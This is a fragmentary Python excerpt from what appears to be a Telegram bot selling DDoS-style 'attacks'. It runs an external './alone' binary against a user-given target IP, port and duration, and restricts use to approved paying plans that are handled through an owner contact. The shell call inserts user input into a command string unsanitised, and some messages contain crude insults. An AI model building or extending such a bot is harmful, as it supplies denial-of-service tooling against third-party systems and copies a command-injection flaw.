...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./alone {target_ip} {target_port} {duration} 200")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*❌ ACCESS DENIED!*\n"  # Access Denied message
                                       "*YOU NEED TO BE APPROVED TO USE THIS BOT.*", parse_mode='Markdown')  # Contact owner message
            return
        ...
        if bot.attack_in_progress:
            bot.send_message(chat_id, "*⚠️ RUK JA BE LAUDE*\n"  # Busy message
                                       "*CHECK REMAINING TIME /when command.*", parse_mode='Markdown')  # Check remaining time
            return
...
def when_command(message):
    ...
    if bot.attack_in_progress:
        ...
        bot.send_message(chat_id, "*❌ NO ATTACK RUNNING*\n"
                                   "*REDY FOR LAUNCH NEW ATTACK*", parse_mode='Markdown')
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "* CONTACT THE OWNER: @GODxAloneBOY* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 APPROVEL PENDING* \n"  # Not approved message
        response += "*DM OWNNER: @GODxAloneBOY* ✅"  # Contact owner message
    else:
